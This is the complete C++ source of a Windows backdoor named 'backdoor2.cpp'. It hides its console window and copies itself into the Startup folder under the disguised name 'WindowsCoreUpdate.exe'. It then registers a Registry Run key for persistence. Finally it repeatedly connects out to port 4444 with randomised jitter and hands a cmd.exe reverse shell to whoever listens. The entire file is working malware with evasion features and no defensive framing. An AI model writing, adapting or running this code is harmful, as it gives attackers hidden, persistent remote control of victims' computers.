// (equivalent to Variant 1 – persistence via Run key + startup folder + jitter)
// cl backdoor2.cpp ws2_32.lib user32.lib advapi32.lib /O2 /MT

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <random>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

const char* HOST = "127.0.0.1";
const u_short PORT = 4444;
const int BASE_DELAY = 4000;
const int JITTER_MS = 3000;

void AddPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // Startup folder copy
    char startup[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
    std::string dest = std::string(startup) + "\\WindowsCoreUpdate.exe";
    CopyFileA(path, dest.c_str(), FALSE);

    // Registry Run
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsCoreUpdate", 0, REG_SZ, (BYTE*)dest.c_str(), dest.size() + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    AddPersistence();

    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_real_distribution<> dis(0.0, 1.0);

    while (true) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
            Sleep(BASE_DELAY + (int)(dis(gen) * JITTER_MS));
            continue;
        }

        sockaddr_in addr = {};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(PORT);
        inet_pton(AF_INET, HOST, &addr.sin_addr);

        if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(s);
            Sleep(BASE_DELAY + (int)(dis(gen) * JITTER_MS));
            continue;
        }

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        char cmd[] = "cmd.exe";

        if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            closesocket(s);
            Sleep(BASE_DELAY + (int)(dis(gen) * JITTER_MS));
            continue;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        closesocket(s);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WSACleanup();
    return 0;
}